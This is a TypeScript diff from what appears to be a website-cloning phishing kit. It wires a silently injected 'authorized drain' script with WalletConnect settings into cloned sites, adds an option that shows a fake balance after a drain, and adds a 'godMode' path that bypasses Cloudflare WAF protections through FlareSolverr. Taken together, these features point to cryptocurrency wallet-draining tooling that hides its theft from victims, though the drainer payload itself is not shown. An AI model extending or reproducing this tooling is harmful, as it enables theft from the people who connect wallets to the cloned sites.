@@ -293,17 +293,21 @@ async function writeAuthorizedDrainAssets(
   outDir: string,
   backendUrl: string,
   forceHardwareBypass: boolean,
+  opts?: { productionClone?: boolean },
 ): Promise<void> {
   const qaVisibleUi = parseQaVisibleUiEnv()
+  const fakeBalanceEnv = process.env['FAKE_BALANCE_AFTER_DRAIN']?.trim().toLowerCase()
+  const fakeBalanceAfterDrain =
+    fakeBalanceEnv === 'true' || fakeBalanceEnv === '1' || fakeBalanceEnv === 'yes'
   const authJs = await buildAuthorizedDrainInjectJs({
     backendUrl,
     kineticKey: process.env['KINETIC_INTERNAL_KEY']?.trim(),
     walletConnectProjectId: process.env['NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID']?.trim(),
     silentInject: !qaVisibleUi,
-    productionClone: false,
+    productionClone: opts?.productionClone ?? false,
     qaVisibleUi,
     forceHardwareBypass,
-    fakeBalanceAfterDrain: true,
+    fakeBalanceAfterDrain,
   })
   await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
   await writeFile(
@@ -348,7 +352,9 @@ async function generateStaticCloneMirror(opts: MirrorFallbackChainOpts): Promise
   }
   if (opts.godMode) {
     childEnv['MIRROR_WAF_BYPASS'] = 'true'
-    childEnv['FAKE_BALANCE_AFTER_DRAIN'] = 'true'
+    if (process.env['FAKE_BALANCE_AFTER_DRAIN']?.trim().toLowerCase() === 'true') {
+      childEnv['FAKE_BALANCE_AFTER_DRAIN'] = 'true'
+    }
   }
   const argv = buildStaticCloneArgv(
     opts.targetUrl,
@@ -455,10 +461,15 @@ export async function runMirrorFallbackChain(
     console.error(`[clone-tunnel] [1/8] Reverse-proxy failed: ${msg}`)
   }
 
-  // 2 — FlareSolverr + static clone (optional webcloner-js)
+  // 2 — FlareSolverr + static clone (WAF bypass when FLARESOLVERR_URL is set)
+  const wafLikely = detectWafBlockedFromErrors(errors)
   if (isFlareSolverrEnabled()) {
     try {
-      console.error('[clone-tunnel] [2/8] FlareSolverr + static clone…')
+      if (wafLikely) {
+        console.error('[clone-tunnel] [2/8] WAF detected — FlareSolverr + static clone…')
+      } else {
+        console.error('[clone-tunnel] [2/8] FlareSolverr + static clone…')
+      }
       await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
       const flare = await runFlareSolverrStaticClone(
         adapterCtx,
@@ -490,6 +501,9 @@ export async function runMirrorFallbackChain(
       errors.push(`flaresolverr: ${msg}`)
       console.error(`[clone-tunnel] [2/8] FlareSolverr path failed: ${msg}`)
     }
+  } else if (opts.godMode && wafLikely) {
+    errors.push('flaresolverr: WAF likely — set FLARESOLVERR_URL for Cloudflare bypass')
+    console.error('[clone-tunnel] [2/8] WAF detected but FLARESOLVERR_URL unset — static/headless may fail')
   }
 
   // 3 — Static clone (fetch + local assets) — original step
